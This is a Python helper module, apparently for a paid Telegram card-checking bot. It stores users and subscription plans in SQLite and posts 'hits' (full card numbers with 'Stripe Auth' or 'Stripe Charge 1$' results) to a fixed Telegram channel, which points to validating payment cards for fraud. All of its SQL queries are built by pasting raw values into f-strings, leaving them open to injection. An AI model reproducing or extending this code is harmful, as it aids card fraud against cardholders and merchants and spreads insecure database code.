#RANDOM GEN FUNCTION
def randgen(len=6):
  import string
  import random
  chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
  return ''.join(random.choice(chars) for _ in range(len))
#insert registration data
def insert_reg_data(user_id,username,antispam_time,reg_at):
  import sqlite3
  conn = sqlite3.connect('plugins/xcc_db/users.db')
  db = conn.cursor()
  db.execute(f"INSERT INTO users VALUES ('{user_id}','{username}','FREE','N/A','N/A','100','30','{antispam_time}','0','{reg_at}')")
  conn.commit()
  conn.close()

# fetch info from userid
def fetchinfo(user_id):
  import sqlite3
  conn = sqlite3.connect('plugins/xcc_db/users.db')
  db = conn.cursor()
  db.execute(f"SELECT * FROM users WHERE id='{user_id}'")
  info = db.fetchone()
  conn.commit()
  conn.close()
  return info

# fetch all info from table
def getalldata(table_name):
  import sqlite3
  conn = sqlite3.connect('plugins/xcc_db/users.db')
  db = conn.cursor()
  db.execute(f"SELECT * FROM {table_name}")
  info = db.fetchall()
  conn.commit()
  conn.close()
  return info

#UPDATE DATA FROM TABLE
def updatedata(user_id,module_name,value):
  import sqlite3
  conn = sqlite3.connect('plugins/xcc_db/users.db')
  c = conn.cursor()
  c.execute(f"UPDATE users SET {module_name}='{value}' WHERE id='{user_id}'")
  conn.commit()
  conn.close()

#PLAN AND EXPIRY CHECK
async def plan_expirychk(user_id):
  try:
    from pyrogram import Client, filters
    from datetime import date
    import sqlite3
    today = str(date.today())
    plan_resp = fetchinfo(user_id)
    expiry = str(plan_resp[4])
    if expiry !='N/A' and expiry < today:
      module_name = "expiry"
      value = "N/A"
      updatedata(user_id,module_name,value)
      module_name = "plan"
      value = "N/A"
      updatedata(user_id,module_name,value)
      resp = """
  𝗛𝗲𝘆 𝗗𝘂𝗱𝗲
  𝗬𝗼𝘂𝗿 𝗖𝘂𝗿𝗿𝗲𝗻𝘁 𝗣𝗹𝗮𝗻 𝗛𝗮𝘀 𝗘𝘅𝗽𝗶𝗿𝗲𝗱.𝗧𝗼 𝗥𝗲𝗴𝗮𝗶𝗻 𝗔𝗰𝗰𝗲𝘀𝘀 𝗣𝘂𝗿𝗰𝗵𝗮𝘀𝗲 𝗮𝗴𝗮𝗶𝗻 𝘂𝘀𝗶𝗻𝗴 /buy
      """
      await Client.send_message(user_id,resp)
  except Exception as e:
      print(e)

async def send_mtc(resp):
  try:
    from pyrogram import Client, filters
    hits_id = "-1001676234297"
    await Client.send_message(hits_id,resp)
  except Exception as e:
      print(e)

async def hits_au(cc,result):
  try:
    from pyrogram import Client, filters
    hits_id = "-1001676234297"
    resp = f"""<b>
  ⊗ Card - <code>{cc}</code>
  ⊗ Response - {result}
  ⊗ GATEWAY - Stripe Auth
    </b>"""
    await Client.send_message(hits_id,resp)
  except Exception as e:
      print(e)

async def hits_chk(cc,result,pi):
  try:
    from pyrogram import Client, filters
    hits_id = "-1001676234297"
    resp = f"""<b>
  ⊗ Card - <code>{cc}</code>
  ⊗ Response - {result}
  ⊗ GATEWAY - Stripe Charge 1$
  ⊗ SRC - <code>{pi}</code>
    </b>"""
    await Client.send_message(hits_id,resp)
  except Exception as e:
      print(e)